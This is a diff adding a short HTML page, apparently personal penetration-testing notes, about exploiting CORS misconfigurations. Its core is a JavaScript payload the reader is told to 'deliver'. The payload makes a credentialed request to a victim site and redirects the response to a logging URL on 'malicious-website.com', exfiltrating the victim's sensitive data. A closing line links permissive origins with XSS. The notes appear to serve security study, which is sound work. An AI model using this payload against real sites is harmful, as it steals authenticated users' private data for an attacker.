@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Vulnerabilities arising from CORS configuration issues</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Vulnerabilities arising from CORS configuration issues</h1><br/><p>If a response for a request contains a header Access-Control-Allow-Credentials then it may be an indicator that CORS is in use.</p><p></p><p>If the website allows any origin/domain to access/request, then deliver this payload:</p><p>var req = new XMLHttpRequest();</p><p>req.onload = reqListener;</p><p>req.open(&#39;get&#39;,&#39;https://vulnerable-website.com/sensitive-victim-data&#39;,true);</p><p>req.withCredentials = true;</p><p>req.send();</p><p></p><p>function reqListener() {</p><p>	location=&#39;//malicious-website.com/log?key=&#39;+this.responseText;</p><p>};</p><p></p><p>This will return any of the sensitive information contained in the response to the exploit server specified.</p><p></p><p>If there is a XSS vulnerable origin that is permissible, it can lead to CORS.</p></div>
+</body>
+</html>
